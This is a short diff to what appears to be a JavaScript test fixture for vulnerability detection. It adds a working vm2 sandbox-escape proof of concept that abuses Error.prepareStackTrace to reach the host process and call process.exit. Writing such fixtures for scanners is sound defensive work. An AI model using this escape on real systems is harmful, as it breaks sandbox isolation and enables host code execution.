@@ -20,3 +20,18 @@ function notExposedVuln() {
   const args = ["a", "b", "c", "d"]
   console.log(minimist(args))
 }
+
+const { VM } = require('vm2');
+
+new VM().run(`
+const { set } = WeakMap.prototype;
+WeakMap.prototype.set = function(v) {
+return set.call(this, v, v);
+};
+Error.prepareStackTrace =
+Error.prepareStackTrace =
+(_, c) => c.map(c => c.getThis()).find(a => a);
+const { stack } = new Error();
+Error.prepareStackTrace = undefined;
+stack.process.exit(1);
+`);
